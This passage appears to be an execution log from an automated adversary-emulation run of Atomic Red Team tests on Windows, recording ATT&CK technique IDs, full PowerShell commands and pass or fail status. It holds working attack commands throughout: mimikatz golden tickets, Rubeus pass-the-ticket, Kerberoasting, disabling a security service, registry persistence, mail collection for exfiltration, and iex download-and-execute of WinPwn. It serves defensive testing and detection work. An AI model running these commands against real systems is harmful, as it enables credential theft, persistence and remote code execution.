                      'Write-Host -ForegroundColor Yellow "The stored password '
                      'for the current user is incorrect. Please run the '
                      'prereq commands to set the correct '
                      'credentials";             Remove-Item '
                      '$credFile;         };         exit $errCode;     };     '
                      'Write-Host -ForegroundColor Cyan "Successfully changed '
                      'the password to lower-long-special-333";     $newCred = '
                      'New-Object System.Management.Automation.PSCredential '
                      '($env:USERNAME, $(ConvertTo-SecureString '
                      '"lower-long-special-333" -AsPlainText -Force));     '
                      '$newCred.Password | ConvertFrom-SecureString | Out-File '
                      '$credFile; }; else {;     Write-Host -ForegroundColor '
                      'Yellow "You must store the password of the current user '
                      'by running the prerequisite commands first"; }',
 'platform': 'windows',
 'run': '2023-11-29T13:17:45Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1114_001__collection__email_collection-_local_email_collection__21363f92027047ce1dbfdd47f7a483b5__trial_1

atomic_ordering: ['21363f92027047ce1dbfdd47f7a483b5']
------------------------------
{'ability_id': '21363f92027047ce1dbfdd47f7a483b5',
 'agent_reported_time': '2023-11-11T13:10:08Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1114.001',
            'technique_name': 'Email Collection: Local Email Collection'},
 'command': 'powershell -executionpolicy bypass -command '
            '"PathToAtomicsFolder\\T1114.001\\src\\Get-Inbox.ps1" -file '
            '$env:TEMP\\mail.csv',
 'delegated': '2023-11-30T02:10:02Z',
 'description': 'Search through local Outlook installation, extract mail, '
                'compress the contents, and saves everything to a directory '
                'for later exfiltration.\n'
                'Successful execution will produce stdout message stating '
                '"Please be patient, this may take some time...". Upon '
                'completion, final output will be a mail.csv file.\n'
                '\n'
                'Note: Outlook is required, but no email account necessary to '
                'produce artifacts.\n',
 'executor': 'psh',
 'link_id': '9a4f2683-effc-473d-9f6c-82098cf343c3',
 'name': 'Email Collection with PowerShell Get-Inbox',
 'pid': 6340,
 'plaintext_command': 'powershell -executionpolicy bypass -command '
                      '"PathToAtomicsFolder\\T1114.001\\src\\Get-Inbox.ps1" '
                      '-file $env:TEMP\\mail.csv',
 'platform': 'windows',
 'run': '2023-11-30T02:10:34Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1123__collection__audio_capture__53d41aa7edbb10cea4c99df8c2b0862f__trial_1

atomic_ordering: ['53d41aa7edbb10cea4c99df8c2b0862f']
------------------------------
{'ability_id': '53d41aa7edbb10cea4c99df8c2b0862f',
 'agent_reported_time': '2023-11-11T13:10:05Z',
 'attack': {'tactic': 'collection',
            'technique_id': 'T1123',
            'technique_name': 'Audio Capture'},
 'command': 'powershell.exe -Command WindowsAudioDevice-Powershell-Cmdlet',
 'delegated': '2023-11-30T04:44:04Z',
 'description': '[AudioDeviceCmdlets](https://github.com/cdhunt/WindowsAudioDevice-Powershell-Cmdlet)\n',
 'executor': 'psh',
 'link_id': 'a7e91dfb-5d3e-4f73-850f-136a644fac6c',
 'name': 'using device audio capture commandlet',
 'pid': 10456,
 'plaintext_command': 'powershell.exe -Command '
                      'WindowsAudioDevice-Powershell-Cmdlet',
 'platform': 'windows',
 'run': '2023-11-30T04:44:37Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1069_001__discovery__permission_groups_discovery-_local_groups__e541c2b62c3259680863a6f3b410e59a__trial_1

atomic_ordering: ['e541c2b62c3259680863a6f3b410e59a']
------------------------------
{'ability_id': 'e541c2b62c3259680863a6f3b410e59a',
 'agent_reported_time': '2023-11-11T13:09:37Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1069.001',
            'technique_name': 'Permission Groups Discovery: Local Groups'},
 'command': 'Get-WMIObject Win32_Group',
 'delegated': '2023-11-28T11:49:08Z',
 'description': 'Utilizing PowerShell cmdlet - get-wmiobject, to enumerate '
                'local groups on the endpoint. Upon execution, Upon execution, '
                'information will be displayed of local groups on system.\n',
 'executor': 'psh',
 'link_id': '95bb0d73-b1c1-48d1-ba2c-176bf9da48f8',
 'name': 'WMIObject Group Discovery',
 'pid': 9672,
 'plaintext_command': 'Get-WMIObject Win32_Group',
 'platform': 'windows',
 'run': '2023-11-28T11:49:21Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1573__command-and-control__encrypted_channel__fb827394b296192cb7a81031a2e37ae2__trial_1

atomic_ordering: ['fb827394b296192cb7a81031a2e37ae2']
==============================
==============================
adversary_id: atomic__t1562_008__defense-evasion__impair_defenses-_disable_cloud_logs__eb9de85953f93fc247c48f1b236839fc__trial_1

atomic_ordering: ['eb9de85953f93fc247c48f1b236839fc']
==============================
==============================
adversary_id: atomic__t1555_003__credential-access__credentials_from_password_stores-_credentials_from_web_browsers__e5279c9ad109fef655e2c1abd6304725__trial_1

atomic_ordering: ['e5279c9ad109fef655e2c1abd6304725']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1082__discovery__system_information_discovery__c58ba91431b9d73d726ccdd7d030a694__trial_1

atomic_ordering: ['c58ba91431b9d73d726ccdd7d030a694']
------------------------------
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1562_001__defense-evasion__impair_defenses-_disable_or_modify_tools__f5b48f9f8e01db3edd487c05580a0e90__trial_1

atomic_ordering: ['f5b48f9f8e01db3edd487c05580a0e90']
------------------------------
{'ability_id': 'f5b48f9f8e01db3edd487c05580a0e90',
 'agent_reported_time': '2023-11-11T13:10:12Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1562.001',
            'technique_name': 'Impair Defenses: Disable or Modify Tools'},
 'command': 'Stop-Service -Name McAfeeDLPAgentService; Remove-Service -Name '
            'McAfeeDLPAgentService',
 'delegated': '2023-12-03T14:44:32Z',
 'description': 'Beginning with Powershell 6.0, the Stop-Service cmdlet sends '
                'a stop message to the Windows Service Controller for each of '
                'the specified services. The Remove-Service cmdlet removes a '
                'Windows service in the registry and in the service '
                'database.\n',
 'executor': 'psh',
 'link_id': '9618101c-134d-4642-bb7a-3ede67108e3c',
 'name': 'Stop and Remove Arbitrary Security Windows Service',
 'pid': 7444,
 'plaintext_command': 'Stop-Service -Name McAfeeDLPAgentService; '
                      'Remove-Service -Name McAfeeDLPAgentService',
 'platform': 'windows',
 'run': '2023-12-03T14:45:08Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_012__multiple__boot_or_logon_autostart_execution-_print_processors__b2725f4e411b9328aa73fe54501a7564__trial_1

atomic_ordering: ['b2725f4e411b9328aa73fe54501a7564']
------------------------------
{'ability_id': 'b2725f4e411b9328aa73fe54501a7564',
 'agent_reported_time': '2023-11-11T13:10:40Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.012',
            'technique_name': 'Boot or Logon Autostart Execution: Print '
                              'Processors'},
 'command': 'if( $(get-service -Name spooler).StartType -eq "Disabled") '
            '{Set-Service -Name "spooler" -StartupType Automatic}; net stop '
            'spooler; Copy-Item '
            '"$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll" '
            'C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll; reg '
            'add '
            '"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows '
            'x64\\Print Processors\\AtomicRedTeam" /v "Driver" /d '
            '"AtomicTest.dll" /t REG_SZ /f; net start spooler; if(0){;   '
            'Restart-Computer; }',
 'delegated': '2023-12-02T08:17:54Z',
 'description': 'Establishes persistence by creating a new print processor '
                'registry key under '
                'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows '
                'x64\\Print Processors.\n'
                'The new print processor will point to a DLL which will be '
                'loaded by the spooler service after a reboot. The DLL will '
                'then create the file AtomicTest.txt in C:\\Users\\Public\\ as '
                'validation that the test is successful.\n'
                '\n'
                'Note: The test assumes a x64 Windows operating system.\n'
                '\n'
                'The payload source code is based on a blog post by stmxcsr: '
                '[https://stmxcsr.com/persistence/print-processor.html](https://stmxcsr.com/persistence/print-processor.html)\n',
 'executor': 'psh',
 'link_id': 'd6ce4a74-969a-4fd6-bc8c-5b65b83be254',
 'name': 'Print Processors',
 'pid': 10992,
 'plaintext_command': 'if( $(get-service -Name spooler).StartType -eq '
                      '"Disabled") {Set-Service -Name "spooler" -StartupType '
                      'Automatic}; net stop spooler; Copy-Item '
                      '"$PathToAtomicsFolder\\T1547.012\\bin\\AtomicTest.dll" '
                      'C:\\Windows\\System32\\spool\\prtprocs\\x64\\AtomicTest.dll; '
                      'reg add '
                      '"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\Windows '
                      'x64\\Print Processors\\AtomicRedTeam" /v "Driver" /d '
                      '"AtomicTest.dll" /t REG_SZ /f; net start spooler; '
                      'if(0){;   Restart-Computer; }',
 'platform': 'windows',
 'run': '2023-12-02T08:18:55Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1558_003__credential-access__steal_or_forge_kerberos_tickets-_kerberoasting__2f03250355bb1403dcfac6808782a192__trial_1

atomic_ordering: ['2f03250355bb1403dcfac6808782a192']
------------------------------
{'ability_id': '2f03250355bb1403dcfac6808782a192',
 'agent_reported_time': '2023-11-11T13:09:56Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.003',
            'technique_name': 'Steal or Forge Kerberos Tickets: Kerberoasting'},
 'command': 'Add-Type -AssemblyName System.IdentityModel  ; setspn.exe -T '
            "%USERDNSDOMAIN% -Q */* | Select-String '^CN' -Context 0,1 | % { "
            'New-Object '
            'System.IdentityModel.Tokens.KerberosRequestorSecurityToken '
            '-ArgumentList $_.Context.PostContext[0].Trim() }',
 'delegated': '2023-12-03T05:42:28Z',
 'description': 'The following test will utilize native PowerShell Identity '
                'modules to query the domain to extract allthe Service '
                'Principal Names. This behavior is typically used during a '
                'kerberos or silver ticket attack. \n'
                'A successful execution will output the SPNs for the domain in '
                'question.\n',
 'executor': 'psh',
 'link_id': '105f59bc-f398-41f3-8f34-3d80f6fe185f',
 'name': 'Request All Tickets via PowerShell',
 'pid': 2004,
 'plaintext_command': 'Add-Type -AssemblyName System.IdentityModel  ; '
                      'setspn.exe -T %USERDNSDOMAIN% -Q */* | Select-String '
                      "'^CN' -Context 0,1 | % { New-Object "
                      'System.IdentityModel.Tokens.KerberosRequestorSecurityToken '
                      '-ArgumentList $_.Context.PostContext[0].Trim() }',
 'platform': 'windows',
 'run': '2023-12-03T05:42:47Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1078_004__multiple__valid_accounts-_cloud_accounts__987057c2b2cf415214afef9ea59378e5__trial_1

atomic_ordering: ['987057c2b2cf415214afef9ea59378e5']
==============================
==============================
adversary_id: atomic__t1218_005__defense-evasion__signed_binary_proxy_execution-_mshta__748882eaad1b31e8f90d9b31692200fe__trial_1

atomic_ordering: ['748882eaad1b31e8f90d9b31692200fe']
------------------------------
{'ability_id': '748882eaad1b31e8f90d9b31692200fe',
 'agent_reported_time': '2023-11-11T13:09:46Z',
 'attack': {'tactic': 'defense-evasion',
            'technique_id': 'T1218.005',
            'technique_name': 'Signed Binary Proxy Execution: Mshta'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Invoke-ATHHTMLApplication -HTAUri '
            'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta '
            '-MSHTAFilePath $env:windir\\system32\\mshta.exe',
 'delegated': '2023-11-30T23:25:32Z',
 'description': 'Executes an HTA Application by directly downloading from '
                'remote URI.',
 'executor': 'psh',
 'link_id': '6425f868-3147-48d4-9f0b-19f036135533',
 'name': 'Invoke HTML Application - Direct download from URI',
 'pid': 3240,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  Invoke-ATHHTMLApplication '
                      '-HTAUri '
                      'https://raw.githubusercontent.com/redcanaryco/atomic-red-team/24549e3866407c3080b95b6afebf78e8acd23352/atomics/T1218.005/src/T1218.005.hta '
                      '-MSHTAFilePath $env:windir\\system32\\mshta.exe',
 'platform': 'windows',
 'run': '2023-11-30T23:26:07Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1219__command-and-control__remote_access_software__aada5380e7d0a4c7b71f2a324d9d5327__trial_1

atomic_ordering: ['aada5380e7d0a4c7b71f2a324d9d5327']
------------------------------
{'ability_id': 'aada5380e7d0a4c7b71f2a324d9d5327',
 'agent_reported_time': '2023-11-11T13:09:52Z',
 'attack': {'tactic': 'command-and-control',
            'technique_id': 'T1219',
            'technique_name': 'Remote Access Software'},
 'command': 'Invoke-WebRequest -OutFile '
            'C:\\Users\\$env:username\\Desktop\\AnyDesk.exe '
            'https://download.anydesk.com/AnyDesk.exe; $file1 = "C:\\Users\\" '
            '+ $env:username + "\\Desktop\\AnyDesk.exe"; Start-Process $file1 '
            '/S;',
 'delegated': '2023-12-01T05:51:37Z',
 'description': 'An adversary may attempt to trick the user into downloading '
                'AnyDesk and use to establish C2. Download of AnyDesk '
                'installer will be at the destination location and ran when '
                'sucessfully executed.\n',
 'executor': 'psh',
 'link_id': '1f304c19-03cd-4510-b146-4727043f2340',
 'name': 'AnyDesk Files Detected Test on Windows',
 'pid': 7784,
 'plaintext_command': 'Invoke-WebRequest -OutFile '
                      'C:\\Users\\$env:username\\Desktop\\AnyDesk.exe '
                      'https://download.anydesk.com/AnyDesk.exe; $file1 = '
                      '"C:\\Users\\" + $env:username + '
                      '"\\Desktop\\AnyDesk.exe"; Start-Process $file1 /S;',
 'platform': 'windows',
 'run': '2023-12-01T05:52:24Z',
 'status': 0}
------------------------------
^ successfully executed technique
==============================
==============================
adversary_id: atomic__t1543_003__multiple__create_or_modify_system_process-_windows_service__7030b003cc5646c7cc83410d2f057575__trial_1

atomic_ordering: ['7030b003cc5646c7cc83410d2f057575']
------------------------------
{'ability_id': '7030b003cc5646c7cc83410d2f057575',
 'agent_reported_time': '2023-11-11T13:10:56Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1543.003',
            'technique_name': 'Create or Modify System Process: Windows '
                              'Service'},
 'command': 'New-Service -Name "AtomicTestService_PowerShell" -BinaryPathName '
            '"411da5_AtomicService.exe"; Start-Service -Name '
            '"AtomicTestService_PowerShell"',
 'delegated': '2023-12-01T18:09:42Z',
 'description': 'Installs A Local Service via PowerShell.\n'
                'Upon successful execution, powershell will download '
                '`AtomicService.exe` from github. Powershell will then use '
                '`New-Service` and `Start-Service` to start service. Results '
                'will be displayed.\n',
 'executor': 'psh',
 'link_id': '6c72cb20-3a85-4ba9-a489-1512b2942524',
 'name': 'Service Installation PowerShell',
 'pid': 8788,
 'plaintext_command': 'New-Service -Name "AtomicTestService_PowerShell" '
                      '-BinaryPathName "411da5_AtomicService.exe"; '
                      'Start-Service -Name "AtomicTestService_PowerShell"',
 'platform': 'windows',
 'run': '2023-12-01T18:10:37Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1558_001__credential-access__steal_or_forge_kerberos_tickets-_golden_ticket__6d0695f8f33776c82ad1294b6c6f02cd__trial_1

atomic_ordering: ['6d0695f8f33776c82ad1294b6c6f02cd']
------------------------------
{'ability_id': '6d0695f8f33776c82ad1294b6c6f02cd',
 'agent_reported_time': '2023-11-11T13:09:58Z',
 'attack': {'tactic': 'credential-access',
            'technique_id': 'T1558.001',
            'technique_name': 'Steal or Forge Kerberos Tickets: Golden Ticket'},
 'command': 'Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; '
            'Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; '
            '$domain_sid = "S-1-5-21-DEFAULT"; If ($domain_sid -Match '
            '"DEFAULT") {;   $domain = gwmi Win32_ComputerSystem | Select '
            '-Expand Domain;   $krbtgtSID = (New-Object '
            'Security.Principal.NTAccount '
            '$domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   '
            '$domain_sid = $krbtgtSID.SubString(0, '
            '$krbtgtSID.LastIndexOf(\'-\')); }; @"; >%TEMP%\\golden.txt 2>&1 '
            '(;   echo Purge existing tickets and create golden ticket:;   '
            'klist purge;   '
            'PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe '
            '"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID '
            '/aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 '
            '/user:goldenticketfakeuser /ptt" "exit";   echo.;   echo '
            'Requesting SYSVOL:;   dir \\\\%userdnsdomain%\\SYSVOL;   ;   '
            'echo.;   echo Tickets after requesting SYSVOL:;   klist;   '
            'echo.;   echo End of Golden Ticket attack; ); "@ -Replace '
            '"DOMAIN_SID", $domain_sid | Out-File -Encoding OEM '
            '$env:TEMP\\golden.bat; echo "foo" | runas /netonly /user:fake '
            '"$env:TEMP\\golden.bat" | Out-Null; do {;   Start-Sleep 1;   '
            'Get-Content -Path "$env:TEMP\\golden.txt" -Wait | ForEach-Object '
            "{;     if ($_ -match 'End of Golden Ticket attack') { break } ;   "
            '}; } while ($false); Get-Content $env:TEMP\\golden.txt; '
            'Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; '
            'Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore',
 'delegated': '2023-12-03T05:03:46Z',
 'description': 'Once the hash of the special krbtgt user is retrieved it is '
                'possible to craft Kerberos Ticket Granting Ticket '
                'impersonating any user in the Active Directory domain.\n'
                'This test crafts a Golden Ticket and then performs an SMB '
                'request with it for the SYSVOL share, thus triggering a '
                'service ticket request (event ID 4769).\n'
                'The generated ticket is injected in a new empty Windows '
                'session and discarded after, so it does not pollute the '
                'current Windows session.\n',
 'executor': 'psh',
 'link_id': '189cd3ad-91df-4b4b-90c8-6bc54ea2771d',
 'name': 'Crafting Active Directory golden tickets with mimikatz',
 'pid': 6896,
 'plaintext_command': 'Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore; '
                      'Remove-Item $env:TEMP\\golden.txt -ErrorAction Ignore; '
                      '$domain_sid = "S-1-5-21-DEFAULT"; If ($domain_sid '
                      '-Match "DEFAULT") {;   $domain = gwmi '
                      'Win32_ComputerSystem | Select -Expand Domain;   '
                      '$krbtgtSID = (New-Object Security.Principal.NTAccount '
                      '$domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value;   '
                      '$domain_sid = $krbtgtSID.SubString(0, '
                      '$krbtgtSID.LastIndexOf(\'-\')); }; @"; '
                      '>%TEMP%\\golden.txt 2>&1 (;   echo Purge existing '
                      'tickets and create golden ticket:;   klist purge;   '
                      'PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe '
                      '"kerberos::golden /domain:%userdnsdomain% '
                      '/sid:DOMAIN_SID '
                      '/aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 '
                      '/user:goldenticketfakeuser /ptt" "exit";   echo.;   '
                      'echo Requesting SYSVOL:;   dir '
                      '\\\\%userdnsdomain%\\SYSVOL;   ;   echo.;   echo '
                      'Tickets after requesting SYSVOL:;   klist;   echo.;   '
                      'echo End of Golden Ticket attack; ); "@ -Replace '
                      '"DOMAIN_SID", $domain_sid | Out-File -Encoding OEM '
                      '$env:TEMP\\golden.bat; echo "foo" | runas /netonly '
                      '/user:fake "$env:TEMP\\golden.bat" | Out-Null; do {;   '
                      'Start-Sleep 1;   Get-Content -Path '
                      '"$env:TEMP\\golden.txt" -Wait | ForEach-Object {;     '
                      "if ($_ -match 'End of Golden Ticket attack') { break } "
                      ';   }; } while ($false); Get-Content '
                      '$env:TEMP\\golden.txt; Remove-Item '
                      '$env:TEMP\\golden.bat -ErrorAction Ignore; Remove-Item '
                      '$env:TEMP\\golden.txt -ErrorAction Ignore',
 'platform': 'windows',
 'run': '2023-12-03T05:03:50Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1135__discovery__network_share_discovery__d7f1270ba66d5947a1422f7d5b1a36ef__trial_1

atomic_ordering: ['d7f1270ba66d5947a1422f7d5b1a36ef']
------------------------------
{'ability_id': 'd7f1270ba66d5947a1422f7d5b1a36ef',
 'agent_reported_time': '2023-11-11T13:10:27Z',
 'attack': {'tactic': 'discovery',
            'technique_id': 'T1135',
            'technique_name': 'Network Share Discovery'},
 'command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
            'iex(new-object '
            "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
            'shareenumeration -noninteractive -consoleoutput',
 'delegated': '2023-11-30T10:29:20Z',
 'description': 'Network share enumeration using the shareenumeration function '
                'of WinPwn',
 'executor': 'psh',
 'link_id': '3cb3358e-2971-40f4-8ed1-2fd827f8e3e7',
 'name': 'WinPwn - shareenumeration',
 'pid': 10924,
 'plaintext_command': "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; "
                      'iex(new-object '
                      "net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); "
                      'shareenumeration -noninteractive -consoleoutput',
 'platform': 'windows',
 'run': '2023-11-30T10:30:19Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1546_011__multiple__event_triggered_execution-_application_shimming__ed65658e4431bc3b636dd0de29bf8e35__trial_1

atomic_ordering: ['ed65658e4431bc3b636dd0de29bf8e35']
------------------------------
{'ability_id': 'ed65658e4431bc3b636dd0de29bf8e35',
 'agent_reported_time': '2023-11-11T13:09:47Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1546.011',
            'technique_name': 'Event Triggered Execution: Application '
                              'Shimming'},
 'command': 'New-ItemProperty -Path HKLM:"\\SOFTWARE\\Microsoft\\Windows '
            'NT\\CurrentVersion\\AppCompatFlags\\Custom" -Name '
            '"AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"; '
            'New-ItemProperty -Path HKLM:"\\SOFTWARE\\Microsoft\\Windows '
            'NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB" -Name '
            '"AtomicRedTeamT1546.011" -Value "AtomicRedTeamT1546.011"',
 'delegated': '2023-12-01T20:24:50Z',
 'description': 'Create registry keys in locations where fin7 typically places '
                'SDB patches. Upon execution, output will be displayed '
                'describing\n'
                'the registry keys that were created. These keys can also be '
                'viewed using the Registry Editor.\n'
                '\n'
                'https://www.fireeye.com/blog/threat-research/2017/05/fin7-shim-databases-persistence.html\n',
 'executor': 'psh',
 'link_id': '3efee6d2-785a-4514-8186-0dad9a872fab',
 'name': 'Registry key creation and/or modification events for SDB',
 'pid': 5428,
 'plaintext_command': 'New-ItemProperty -Path '
                      'HKLM:"\\SOFTWARE\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\AppCompatFlags\\Custom" -Name '
                      '"AtomicRedTeamT1546.011" -Value '
                      '"AtomicRedTeamT1546.011"; New-ItemProperty -Path '
                      'HKLM:"\\SOFTWARE\\Microsoft\\Windows '
                      'NT\\CurrentVersion\\AppCompatFlags\\InstalledSDB" -Name '
                      '"AtomicRedTeamT1546.011" -Value '
                      '"AtomicRedTeamT1546.011"',
 'platform': 'windows',
 'run': '2023-12-01T20:25:01Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1134_004__multiple__access_token_manipulation-_parent_pid_spoofing__d0966749d457cb6218a8cd5ee5128ea2__trial_1

atomic_ordering: ['d0966749d457cb6218a8cd5ee5128ea2']
------------------------------
{'ability_id': 'd0966749d457cb6218a8cd5ee5128ea2',
 'agent_reported_time': '2023-11-11T13:09:45Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1134.004',
            'technique_name': 'Access Token Manipulation: Parent PID Spoofing'},
 'command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
            '-ListAvailable; if (-not $RequiredModule) {Install-Module -Name '
            'AtomicTestHarnesses -Scope CurrentUser -Force};  ;  '
            'Start-ATHProcessUnderSpecificParent -FilePath '
            '$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe '
            "-CommandLine '-Command Start-Sleep 10' -ParentId $PID",
 'delegated': '2023-11-30T09:13:47Z',
 'description': 'Spawns a powershell.exe process as a child of the current '
                'process.',
 'executor': 'psh',
 'link_id': '0a10de38-1011-4752-bc03-73f774a16083',
 'name': 'Parent PID Spoofing - Spawn from Current Process',
 'pid': 10052,
 'plaintext_command': '$RequiredModule = Get-Module -Name AtomicTestHarnesses '
                      '-ListAvailable; if (-not $RequiredModule) '
                      '{Install-Module -Name AtomicTestHarnesses -Scope '
                      'CurrentUser -Force};  ;  '
                      'Start-ATHProcessUnderSpecificParent -FilePath '
                      '$Env:windir\\System32\\WindowsPowerShell\\v1.0\\powershell.exe '
                      "-CommandLine '-Command Start-Sleep 10' -ParentId $PID",
 'platform': 'windows',
 'run': '2023-11-30T09:14:26Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1550_003__multiple__use_alternate_authentication_material-_pass_the_ticket__566388d2f3073aced1a2c86b3a65826c__trial_1

atomic_ordering: ['566388d2f3073aced1a2c86b3a65826c']
------------------------------
{'ability_id': '566388d2f3073aced1a2c86b3a65826c',
 'agent_reported_time': '2023-11-11T13:10:51Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1550.003',
            'technique_name': 'Use Alternate Authentication Material: Pass the '
                              'Ticket'},
 'command': '& "PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe" '
            '-accepteula \\\\localhost -w c:\\ -c '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" asktgt '
            '/user:Administrator /password:Password /domain:$Env:USERDOMAIN '
            '/outfile:ticket.kirbi; Set-Location '
            '"PathToAtomicsFolder\\..\\ExternalPayloads"; Move-Item -Force '
            '"\\\\localhost\\c$\\ticket.kirbi" ticket.kirbi; Write-Host '
            '"Successfully retrieved TGT from \'localhost\', now requesting a '
            'TGS from local"; & '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" asktgs '
            '/service:cifs/localhost /ticket:ticket.kirbi /ptt; Remove-Item '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\ticket.kirbi"; & '
            '"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" purge',
 'delegated': '2023-12-02T13:48:57Z',
 'description': 'Requesting a TGT on a remote system and retrieving it locally '
                'before requesting a service ticket with it. This is a '
                'Pass-The-Ticket attack because the TGT is obtained on the '
                'remote system, then used from a different machine (local).\n'
                'PsExec is used to execute commands on the remote system, and '
                'the "C$" admin share is used to retrieve the TGT, so the '
                'current user must have admin rights remotely and other PsExec '
                'prerequisites must be met.\n',
 'executor': 'psh',
 'link_id': '62cf9363-9edf-4d4b-918f-cb98920501ad',
 'name': 'Rubeus Kerberos Pass The Ticket',
 'pid': 5528,
 'plaintext_command': '& '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe" '
                      '-accepteula \\\\localhost -w c:\\ -c '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" '
                      'asktgt /user:Administrator /password:Password '
                      '/domain:$Env:USERDOMAIN /outfile:ticket.kirbi; '
                      'Set-Location '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads"; Move-Item '
                      '-Force "\\\\localhost\\c$\\ticket.kirbi" ticket.kirbi; '
                      'Write-Host "Successfully retrieved TGT from '
                      '\'localhost\', now requesting a TGS from local"; & '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" '
                      'asktgs /service:cifs/localhost /ticket:ticket.kirbi '
                      '/ptt; Remove-Item '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\ticket.kirbi"; '
                      '& '
                      '"PathToAtomicsFolder\\..\\ExternalPayloads\\rubeus.exe" '
                      'purge',
 'platform': 'windows',
 'run': '2023-12-02T13:49:54Z',
 'status': 1}
------------------------------
^ failed execution of technique
==============================
==============================
adversary_id: atomic__t1547_005__multiple__boot_or_logon_autostart_execution-_security_support_provider__bd9f08eb7c3215b8a6a7dd1af9ea406a__trial_1

atomic_ordering: ['bd9f08eb7c3215b8a6a7dd1af9ea406a']
------------------------------
{'ability_id': 'bd9f08eb7c3215b8a6a7dd1af9ea406a',
 'agent_reported_time': '2023-11-11T13:09:53Z',
 'attack': {'tactic': 'multiple',
            'technique_id': 'T1547.005',
            'technique_name': 'Boot or Logon Autostart Execution: Security '
                              'Support Provider'},
 'command': '$oldvalue = $(Get-ItemProperty '
            "HKLM:\\System\\CurrentControlSet\\Control\\Lsa -Name 'Security "
            "Packages' | Select-Object -ExpandProperty 'Security Packages'); "
            'Set-ItemProperty -Path '
            '"HKLM:\\System\\CurrentControlSet\\Control\\Lsa" -Name \'Security '
            'Packages old\' -Value "$oldvalue"; $newvalue = "AtomicTest.dll"; '
            'Set-ItemProperty HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa '
            "-Name 'Security Packages' -Value $newvalue",
 'delegated': '2023-12-02T06:40:22Z',
